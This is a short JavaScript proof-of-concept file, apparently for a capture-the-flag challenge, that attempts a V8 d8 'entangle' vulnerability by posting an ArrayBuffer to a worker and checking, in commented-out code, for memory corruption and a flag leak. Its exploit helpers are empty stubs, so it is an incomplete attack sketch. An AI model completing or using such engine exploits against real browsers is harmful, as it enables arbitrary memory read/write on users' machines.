// PoC for V8 d8 entangle vulnerability

const ab = new ArrayBuffer(8);
const arr = new Float64Array(ab);
arr[0] = 1337.0;

print("Main Thread: Initial arr[0] = " + arr[0]);

function getAddress(obj) {
    // return %Addr(obj);
}

function createFakeObject(addr, length) {
    return 0xAAAAAAAA;
}

const worker = new Worker("worker.js");

worker.postMessage({ type: 'entangle_request', address: arr });

let f = new Flag();
f.initialize();

// setTimeout(() => {
//     print("Main Thread: After worker operation, arr[0] = " + arr[0]);

//     if (arr[0] === 0xDEADBEEF) {
//         print("SUCCESS! Main Thread: arr[0] was corrupted by worker. This demonstrates object aliasing/shared memory due to entanglement.");
//         print("This primitive could lead to arbitrary read/write by carefully crafting objects.");

//         worker.postMessage({ type: 'flag_leak_request' });

//     } else {
//         print("Main Thread: arr[0] was NOT corrupted. Entanglement might not have worked as expected or primitive is different.");
//     }
// }, 100);